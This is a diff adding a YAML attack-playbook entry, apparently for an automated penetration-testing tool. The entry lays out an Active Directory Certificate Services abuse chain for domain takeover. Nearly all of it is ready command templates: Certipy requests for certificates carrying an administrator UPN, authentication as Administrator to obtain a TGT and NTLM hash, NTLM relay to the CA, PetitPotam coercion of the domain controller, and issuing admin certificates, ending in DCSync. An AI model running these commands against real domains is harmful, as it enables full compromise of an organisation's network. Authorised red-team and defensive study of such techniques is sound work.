@@ -1,0 +1,43 @@
+id: ad_adcs_esc1
+title: "AD CS — Certipy ESC1/ESC2/ESC8 abuse for domain takeover"
+phase: lateral
+mitre: ["T1649", "T1558"]
+trigger:
+  services: ["kerberos", "ldap", "http", "https", "smb"]
+  ports:    [88, 389, 80, 443, 445]
+  os_any:   ["windows server"]
+  technologies: ["active directory certificate services", "adcs", "certificate authority"]
+keywords: ["adcs", "certipy", "esc1", "esc2", "esc8", "ntlm relay to ca", "vulnerable template"]
+preconditions:
+  - "AD CS deployed (CA host visible in `certutil -dump` or LDAP `pKIEnrollmentService`)"
+  - "Any valid domain user (low priv)"
+steps:
+  - tool: certipy
+    cmd:  "certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -stdout"
+    why:  "Enumerate every CA + template; flags ESC1-ESC11 vulnerabilities directly"
+  - tool: certipy
+    cmd:  "certipy req -u {user}@{domain} -p {password} -ca {ca_name} -template {vulnerable_template} -upn administrator@{domain} -dc-ip {dc_ip}"
+    why:  "ESC1 — request a cert specifying any UPN (template allows EnrolleeSuppliesSubject + auth EKU)"
+  - tool: certipy
+    cmd:  "certipy auth -pfx administrator.pfx -username administrator -domain {domain} -dc-ip {dc_ip}"
+    why:  "Authenticate as Administrator with the issued cert → get TGT + NTLM hash"
+  - tool: certipy
+    cmd:  "certipy req -u {user}@{domain} -p {password} -ca {ca_name} -template {esc2_template} -on-behalf-of {domain}\\Administrator -pfx attacker.pfx"
+    why:  "ESC2/ESC3 — Any-Purpose / Enrollment-Agent template → request on behalf of higher-priv user"
+  - tool: certipy
+    cmd:  "certipy relay -ca {ca_http_endpoint} -template DomainController"
+    why:  "ESC8 — relay machine NTLM auth to AD CS HTTP enrollment (combine with PetitPotam coercion)"
+  - tool: petitpotam
+    cmd:  "PetitPotam.py -u '' -p '' -d {domain} {attacker_listener} {dc_ip}"
+    why:  "Coerce DC machine NTLM auth → relay to certipy → DC cert → DCSync"
+  - tool: certipy
+    cmd:  "certipy ca -ca {ca_name} -u {user}@{domain} -p {password} -issue-policy 'Subject:CN=Administrator'"
+    why:  "ESC7 — if you have ManageCA + ManageCertificates rights → directly issue admin certs"
+expected_outcome: "Domain admin / DC cert → TGT for any user → DCSync → game over"
+fallbacks:
+  - "ESC4 — vulnerable template ACL (write rights) → modify EKU, then ESC1 path"
+  - "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag set globally on CA"
+  - "ESC11 — RPC-based equivalent of ESC8 when HTTP endpoint not exposed"
+references:
+  - "https://github.com/ly4k/Certipy"
+  - "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
